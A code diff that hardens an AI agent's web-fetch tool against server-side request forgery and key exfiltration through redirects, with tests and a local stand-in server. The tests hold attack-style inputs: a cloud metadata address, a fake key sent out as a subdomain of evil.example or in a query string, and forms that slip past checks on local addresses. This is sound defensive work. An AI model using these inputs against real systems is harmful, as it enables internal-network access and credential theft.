@@ -10,6 +10,11 @@
 //! address is also a way out, and a page read a moment ago may be what is
 //! asking for it.
 //!
+//! The approval shows only the first address, so every redirect gets the
+//! browser's check too, and none may lead from elsewhere onto this machine
+//! or the local network. The check reads the address, not what its name
+//! resolves to: a name pointed at a local address still gets through.
+//!
 //! The HTML reduction is a small scanner rather than a parser: the model
 //! reads the words, not the layout, and a whole HTML engine is a lot of
 //! binary for that.
@@ -76,7 +81,10 @@ impl Tool for WebFetch {
         }, "required": ["url"]})
     }
     fn run(&self, args: &Value, _: &ToolContext) -> Result<String, String> {
-        fetch(args["url"].as_str().unwrap_or_default())
+        fetch(
+            args["url"].as_str().unwrap_or_default(),
+            &crate::browser::secrets(),
+        )
     }
     fn needs_approval(&self) -> bool {
         true
@@ -86,23 +94,44 @@ impl Tool for WebFetch {
     }
 }
 
-/// The page at `url` as text, after its final address.
-fn fetch(url: &str) -> Result<String, String> {
+/// The page at `raw` as text, after its final address, unless it or a
+/// redirect on the way carries one of `secrets`.
+fn fetch(raw: &str, secrets: &[String]) -> Result<String, String> {
     let url =
-        reqwest::Url::parse(url.trim()).map_err(|_| format!("`{url}` is not a web address."))?;
+        reqwest::Url::parse(raw.trim()).map_err(|_| format!("`{raw}` is not a web address."))?;
     if !matches!(url.scheme(), "http" | "https") {
         return Err("Only http and https pages can be fetched.".into());
     }
+    // As written, since parsing lowercases the host and a key can be sent out
+    // as part of a name, and as parsed, since that is what is fetched and the
+    // browser reads `http:/10.0.0.1` as a name.
+    crate::browser::address(raw, secrets)?;
+    crate::browser::address(url.as_str(), secrets)?;
+    // A redirect arrives parsed, so a key is looked for in lowercase too.
+    let secrets: Vec<String> = secrets
+        .iter()
+        .flat_map(|secret| [secret.clone(), secret.to_lowercase()])
+        .collect();
+    let policy = reqwest::redirect::Policy::custom(move |hop| {
+        match follow(hop.previous(), hop.url(), &secrets) {
+            Ok(()) => hop.follow(),
+            Err(why) => hop.error(why),
+        }
+    });
     let client = reqwest::blocking::Client::builder()
         .timeout(Duration::from_secs(20))
-        .redirect(reqwest::redirect::Policy::limited(5))
+        .redirect(policy)
         .user_agent(concat!("Letronna/", env!("CARGO_PKG_VERSION")))
         .build()
         .map_err(|e| e.to_string())?;
-    let response = client
-        .get(url)
-        .send()
-        .map_err(|e| format!("Could not fetch the page: {e}"))?;
+    let response = client.get(url).send().map_err(|e| {
+        // reqwest's own words for a refused redirect only say that one failed;
+        // why is in its source.
+        match std::error::Error::source(&e) {
+            Some(why) if e.is_redirect() => why.to_string(),
+            _ => format!("Could not fetch the page: {e}"),
+        }
+    })?;
     let status = response.status();
     if !status.is_success() {
         return Err(format!("The page answered HTTP {}.", status.as_u16()));
@@ -135,6 +164,67 @@ fn fetch(url: &str) -> Result<String, String> {
         return Err(format!("That is not a page of text ({kind})."));
     };
     Ok(format!("{address}\n\n{text}"))
+}
+
+/// Whether a redirect from the addresses in `previous` on to `next` is
+/// followed, or why not.
+fn follow(
+    previous: &[reqwest::Url],
+    next: &reqwest::Url,
+    secrets: &[String],
+) -> Result<(), String> {
+    // `previous` starts with the address asked for, so this is five redirects.
+    if previous.len() > 5 {
+        return Err("The page redirected more than five times.".into());
+    }
+    crate::browser::address(next.as_str(), secrets)
+        .map_err(|why| format!("The page redirected somewhere that is not fetched. {why}"))?;
+    if local(next) && !previous.iter().all(local) {
+        return Err(
+            "The page redirected to this machine or the local network, which is fetched only \
+             when asked for directly."
+                .into(),
+        );
+    }
+    Ok(())
+}
+
+/// Whether `url` names this machine or the local network by its host.
+fn local(url: &reqwest::Url) -> bool {
+    let host = url.host_str().unwrap_or_default();
+    let ip = host.trim_matches(['[', ']']).parse::<std::net::IpAddr>();
+    match ip.map(|ip| ip.to_canonical()) {
+        Ok(std::net::IpAddr::V4(ip)) => {
+            // Tailscale hands out 100.64.0.0/10, and a tailnet is as private
+            // as a LAN.
+            let shared = ip.octets()[0] == 100 && (ip.octets()[1] & 0xc0) == 64;
+            ip.is_loopback()
+                || ip.is_private()
+                || ip.is_link_local()
+                || ip.is_unspecified()
+                || shared
+        }
+        Ok(std::net::IpAddr::V6(ip)) => {
+            ip.is_loopback()
+                || ip.is_unspecified()
+                || ip.is_unique_local()
+                || ip.is_unicast_link_local()
+        }
+        Err(_) => {
+            // No public name lacks a dot, so one without is found on the local
+            // network, and these endings are kept for private networks.
+            let name = host.trim_end_matches('.');
+            let zones = [
+                ".localhost",
+                ".local",
+                ".home.arpa",
+                ".internal",
+                ".lan",
+                ".ts.net",
+            ];
+            !name.contains('.') || zones.iter().any(|zone| name.ends_with(zone))
+        }
+    }
 }
 
 /// The page's title, when it has one.
@@ -254,6 +344,9 @@ fn tidy(text: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::io::Write;
+    use std::net::TcpListener;
+    use std::sync::{Arc, Mutex};
 
     const PAGE: &str = r#"<!DOCTYPE html>
 <html><head><title>Rust &amp; Letronna</title>
@@ -280,14 +373,130 @@ mod tests {
 
     #[test]
     fn only_web_addresses_are_fetched() {
-        assert!(fetch("file:///C:/Windows/win.ini").is_err());
-        assert!(fetch("not an address").is_err());
+        assert!(fetch("file:///C:/Windows/win.ini", &[]).is_err());
+        assert!(fetch("not an address", &[]).is_err());
+    }
+
+    #[test]
+    fn an_address_the_browser_would_refuse_is_not_fetched() {
+        let why = fetch("http://169.254.169.254/latest/meta-data/", &[]).unwrap_err();
+        assert!(why.contains("metadata"), "{why}");
+        // One slash short still fetches the same address.
+        let why = fetch("http:/169.254.169.254/latest/meta-data/", &[]).unwrap_err();
+        assert!(why.contains("metadata"), "{why}");
+        // Sent out as a name, a key keeps its capitals only as written.
+        let key = "Sk-Live-0123456789ABCDEF".to_owned();
+        let why = fetch(&format!("https://{key}.evil.example/"), &[key]).unwrap_err();
+        assert!(why.contains("keys or tokens"), "{why}");
+    }
+
+    #[test]
+    fn a_redirect_may_not_lead_from_elsewhere_onto_this_machine_or_network() {
+        let url = |url: &str| reqwest::Url::parse(url).unwrap();
+        let away = [url("https://example.com/")];
+        for inward in [
+            "http://127.0.0.1:8080/",
+            "http://2130706433/",
+            "http://localhost/",
+            "http://app.localhost./",
+            "http://0.0.0.0/",
+            "http://192.168.1.1/admin",
+            "http://10.0.0.5/",
+            "http://100.101.102.103/",
+            "http://[::1]/",
+            "http://[::ffff:127.0.0.1]/",
+            "http://[fd12:3456::1]/",
+            "http://router/",
+            "http://nas.local/",
+        ] {
+            let why = follow(&away, &url(inward), &[]).unwrap_err();
+            assert!(why.contains("local network"), "{inward}: {why}");
+        }
+        assert!(follow(&away, &url("https://www.example.com/"), &[]).is_ok());
+        assert!(follow(&away, &url("http://100.128.0.1/"), &[]).is_ok());
+        // Asked for directly, a local page may move about on this machine,
+        // but not by way of somewhere else.
+        let here = [url("http://127.0.0.1:3000/")];
+        assert!(follow(&here, &url("http://localhost:3000/app"), &[]).is_ok());
+        let via = [url("http://127.0.0.1:3000/"), url("https://example.com/")];
+        assert!(follow(&via, &url("http://192.168.1.1/"), &[]).is_err());
+    }
+
+    /// A server on this computer that answers each request with what
+    /// `answer` makes of its path, and the paths it has been asked for.
+    fn serve(answer: fn(&str) -> String) -> (String, Arc<Mutex<Vec<String>>>) {
+        let server = TcpListener::bind("127.0.0.1:0").unwrap();
+        let base = format!("http://{}", server.local_addr().unwrap());
+        let asked = Arc::new(Mutex::new(Vec::new()));
+        let heard = asked.clone();
+        std::thread::spawn(move || {
+            for mut socket in server.incoming().flatten() {
+                // A request that never ends is answered as it stands rather
+                // than holding the server, so a test fails instead of hanging.
+                let _ = socket.set_read_timeout(Some(Duration::from_secs(10)));
+                let mut head = Vec::new();
+                let mut block = [0; 4096];
+                while !head.windows(4).any(|w| w == b"\r\n\r\n") {
+                    match socket.read(&mut block) {
+                        Ok(n) if n > 0 => head.extend_from_slice(&block[..n]),
+                        _ => break,
+                    }
+                }
+                let head = String::from_utf8_lossy(&head);
+                let path = head.split(' ').nth(1).unwrap_or_default().to_owned();
+                let reply = answer(&path);
+                heard.lock().unwrap().push(path);
+                let _ = socket.write_all(reply.as_bytes());
+            }
+        });
+        (base, asked)
+    }
+
+    /// Where each page of the stand-in site sends the fetch on to.
+    fn site(path: &str) -> String {
+        let to = match path {
+            "/hop" => "/end",
+            "/loop" => "/loop",
+            "/metadata" => "http://169.254.169.254/latest/meta-data/",
+            "/leak" => "/?k=sk-live-0123456789abcdef",
+            "/name" => "http://Sk-Live-0123456789ABCDEF.invalid/",
+            _ => {
+                return "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 7\r\n\
+                        Connection: close\r\n\r\narrived"
+                    .into();
+            }
+        };
+        format!(
+            "HTTP/1.1 302 Found\r\nLocation: {to}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+        )
+    }
+
+    #[test]
+    fn every_redirect_is_checked_like_the_address_asked_for() {
+        let (base, asked) = serve(site);
+        let key = "sk-live-0123456789abcdef".to_owned();
+        let page = fetch(&format!("{base}/hop"), std::slice::from_ref(&key)).unwrap();
+        assert_eq!(page, format!("{base}/end\n\narrived"));
+        let why = fetch(&format!("{base}/metadata"), &[]).unwrap_err();
+        assert!(why.contains("metadata"), "{why}");
+        let why = fetch(&format!("{base}/leak"), std::slice::from_ref(&key)).unwrap_err();
+        assert!(why.contains("keys or tokens"), "{why}");
+        // A redirect's host arrives lowercased, capitals and all.
+        let named = "Sk-Live-0123456789ABCDEF".to_owned();
+        let why = fetch(&format!("{base}/name"), &[named]).unwrap_err();
+        assert!(why.contains("keys or tokens"), "{why}");
+        let why = fetch(&format!("{base}/loop"), &[]).unwrap_err();
+        assert!(why.contains("more than five"), "{why}");
+        let asked = asked.lock().unwrap();
+        assert!(!asked.iter().any(|path| path.contains(&key)), "{asked:?}");
+        // The address asked for, then the five redirects that are followed.
+        assert_eq!(asked.iter().filter(|path| *path == "/loop").count(), 6);
     }
 
     #[test]
     #[ignore = "Fetches https://example.com: run with --ignored when online"]
     fn fetches_a_real_page() {
-        let page = fetch("https://example.com").unwrap();
+        let page = fetch("https://example.com", &[]).unwrap();
         assert!(page.contains("Example Domain"), "{page}");
     }
 }
